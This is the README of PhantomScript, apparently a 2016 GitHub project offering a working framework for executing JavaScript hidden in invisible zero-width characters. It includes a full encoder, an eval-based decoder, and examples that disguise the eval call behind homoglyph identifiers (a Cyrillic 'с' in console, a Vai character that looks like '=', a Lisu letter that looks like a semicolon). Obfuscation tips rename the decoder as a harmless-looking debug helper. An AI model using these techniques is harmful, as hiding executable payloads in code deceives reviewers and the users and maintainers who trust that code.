![](https://raw.githubusercontent.com/jagracey/PhantomScript/020172df875ae4dacac9f719228f7746ad34b98b/resources/phantomScript.jpg)


### A better way to execute arbitrary invisible code using a little social engineering.
Once the decoder script is added- we can set the decoder function to just about any variable for some great fun.


### Delightfully familiar Examples
0.
<strong><a id="jquery" href="#jquery">Seem familiar?</a></strong>
```javascript
// Hide and obvouscate somewhere.
$\u{200D} = decodedEval;


var selector = $‍('﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿#selector')
```

1.
<strong><a id="semicolons" href="#semicolons">Dangerous Semi-colons (AKA the LISU LETTER TONE MYA NA character)</a></strong>
```javascript
var \u{A4FC} = decodedEval;

// Sweet and simple
ꓼ('﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿')
```

2.
<strong><a id="cyrillic" href="#cyrillic">Cyrillic characters look normal!</a></strong>
```javascript
// Using U+0441 CYRILLIC SMALL LETTER ES   (the "c" is different)
var сonsole = { log: decodedEval };

// the ES6 shorthand function call (the two backticks)
сonsole.log('﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿Check Point');
```

3.
<strong><a id="templates" href="#templates">ECMAScript 6 can use templates to call functions!</a></strong>
```javascript
// There is an Unicode Han Character 'U+200AD' (U+200AD) acting as the function.
// String templates expose the raw string array via "raw".
var \u{200AD}= function(x){ decodedEval(x.raw[0]) };

// A lone function + template
𠂭`﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿`

// Or a more natural alternative:
var PORT = 3000;
var a = 𠂭`﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿Express app is now running. Try it out at http://localhost:#{PORT}`
```

4.
<strong><a id="overwride" href="#overwride">Overriding toString or console.log</a></strong>
```javascript
// If someone overwrites toString or console.log with the decodedEval function then this should work:
'﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿'


console.l\u{03BF}g = function(str){ decodedEval(str); return console.log(str); };

// Since visible text is filtered out, we can add normal looking text to fit in.
// Also, the 'o' in log is U+03BF
console.lοg('﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿Normal Looking Text');
```



5.
<strong><a id="proxies" href="proxies">We can use Proxies for method calls.</a></strong>
```javascript
// Hide this somewhere, and of course obfuscate it
var anyObject = new Proxy({}, { get: _=> decodedEval });

anyObject.get('﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿');
```

6.
<strong><a id="bait-switch" href="bait-switch">We can trick the user with bait and switch tactics</a></strong>
```javascript
// Using U+0441 CYRILLIC SMALL LETTER ES, again
var funс1 = decodedEval;
var funс2 = funс1.bind(this,'﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿');   // Yeah this ones basically static.


// Bait and Switched.
var func2 = function(){}; // No Operation, but could be anything, since it isn't actually run.
setTimeout(funс2, 0);


// OR another switch
function func1(thing){
    return thing.toUpperCase();
}
funс1('﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿');

// or even better:
fooStr = 'bar';
fooStr.replace(/bar|Whatever Regex Here/,funс2);

```

7.
<strong><a id="assignment" href="assignment">Faked Variable Assignment</a></strong>
```javascript
// Hide this away somewhere. Uses the U+A60C VAI SYLLABLE LENGTHENER character (=)
var input\u{A60C}= function(x){ decodedEval(x.raw[0]) };

const input;
inputꘌ`﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿`;

```


8.
<strong><a id="conditional" href="conditional">Faked Conditional</a></strong>
```javascript
// Hide this away somewhere. Uses the U+A60C VAI SYLLABLE LENGTHENER character (=)
var myVar\u{A60C}\u{A60C}\u{A60C} = function(x){ decodedEval(x.raw[0]) };

// The triple equal sign  (Strict Equality Comparison) isn't a real.
if ( myVarꘌꘌꘌ`﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿hello` ){
 // Random code from MDN below:
 var Person = function (firstName) {
    this.firstName = firstName;
  };

  Person.prototype.sayHello = function() {
    console.log("Hello, I'm " + this.firstName);
  };

  var person1 = new Person("Alice");
  var person2 = new Person("Bob");

  person1.sayHello(); // logs "Hello, I'm Alice"
  person2.sayHello(); // logs "Hello, I'm Bob"

}
```



## Ideas to explore (and submit back here)

- U+1680 OGHAM SPACE MARK  ( looks like a dash, but acts as a space )
- setTimeout('alert()', 0);
- bind/call/apply
- myArray.push("World");
- if (count == 3){ // evaluated if count is 3 }
- while (true){ // An infinite loop! }
- switch statements






## Add in the "decoderEval" script:
*Remember, this would normally be obfuscated- yet friendly looking*

```javascript
  /**
  * Decoder
  */

  var decode = function(val){
    return Array
      .from(val)
      .map(x=>x.charCodeAt() )
      .filter(x=>(x === 0 || x === 65279 ))
      .map(x=>x & 1)
      .join('')
      .match(/.{8}/g)
      .map(function(c){
         return String.fromCharCode(parseInt(c,2))
      })
      .join('');
  };


  /**
  * DecodedEval - Actually eval the decoded payload.
  */
  var decodedEval = function(code){
    []["filter"]["constructor"]( decode(code) )();
  };

```

#### The Encoder
*This parts for you to encode whatever you want. Note that all non-ascii characters are converted to unicode code point escaping. This keeps the payload more dense- after all, out of the 10FFFF (allocated) unicode code points, it would take 21 invisible characters to encode one visible character.*
```javascript

  /**
  * Encoder
  */
  var encode = function(payload){
    var convert2Ascii = function(text){
      return Array
      .from(text)
      .map(function(char){
        if ( /[^\x00-\x7F]/g.test(char) ){
          return char
          .split('')
          .map(x=>`\\u{${ (x.charCodeAt()).toString(16) }}`)
          .join('');
        }
        else
          return char;
      })
      .join('');
    };

    return convert2Ascii(payload)
      .split('')
      // Adds 9th bit, then slices it off for zero padding.
      .map(x=>(0x100 | x.charCodeAt()).toString(2).slice(1))
      .join('')
      .split('')
      .map(x=>String.fromCharCode(x*0xFEFF))
      .join('');
  };
```


# Decoder Obfuscation tips
*PhantomScript is only a lightweight framework for social engineering. Of course you can expect that the most successful code will be obfuscated- yet friendly.*
```javascript

// You could split up the core functionality a bit more.
var debugFormatter = function(array){
  return Array
    .from(val)
    .map(x=>x.charCodeAt() )
    .filter(x=>(x === 0 || x === 65279 ))
    .map(x=>x & 1)
    .join('')
    .match(/.{8}/g)
    .map(function(c){
       return String.fromCharCode(parseInt(c,2))
    })
    .join('');
};

// Eval/Function can be assigned to a friendly variable. Strings can do no wrong, right?  ಠ_ಠ
var debug =  ( str => String.apply.constructor(str)() );



// Using the above, decodedEval to be renamed and defined as such, with some comments.


    /*
     * Still working on this.
     * Eg: debugVal(obj) nicely formats obj for better squashing of bugz.
     */
    var debugVal = function(val){
      var formattedStr = debugFormatter( Array.from(val) );
      var res = debug( formattedStr );
      // TODO: Add NPM's Chalk package for color.
      console.log( res );
      return res;
    };
```




### How is this possible?
It's actually quite easy to save data with invisible, zero-width characters in Unicode. Currently, only U+0000 and U+FFEF are used for broad compatibility, but certainly there are many many characters to choose from out of the 1.1 million (allocated) unicode code points from the 17 Astrals planes. It might be worth mentioning only ~120,000 characters are actually currently defined in Unicode 8.0, but there are lots of combinations possible with the diacritics etc.

The harder and more critical work is the social engineering aspect. ECMAScript 6 has made a big push for internationalizing characters, and as such now permits unicode in variable names using [Unicode Code Point Escape Sequences](https://github.com/jagracey/Awesome-Unicode#creatively-naming-variables-and-methods).

Any Unicode character that has been designated with the property of [ID_START](https://codepoints.net/search?IDS=1) can be used at the beginning of a variable name.  Any character with the designated property of [ID_CONTINUE](https://codepoints.net/search?IDC=1) can be used after the first character - sort of like numbers in JavaScript variable names.

Here are some valid variable names to further pique your interest.
 - `ꓸ`   `\u{A4F8}`
 - `ꓹ`   `\u{A4F9}`
 - `ꓼ`   `\u{A4FC}`
 - `ꓽ`   `\u{A4FD}`

#### See [Awesome-Unicode](https://github.com/jagracey/Awesome-Unicode) for a whole lot more about Unicode, especially its quirks and capabilities.


### Limitations
Many font packages do not support the characters you wish to use, representing characters as boxes or question marks.  Try and stick to the lower numbered characters.



<br><br>

# Contributing

Contributions are absolutely welcome- and encouraged.
Please do make sure that the Unicode characters used in your code actually show up in Github, the NodeJS REPL, and most major text editors.


# License

The MIT License (MIT)

Copyright (c) 2016 John Gracey

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
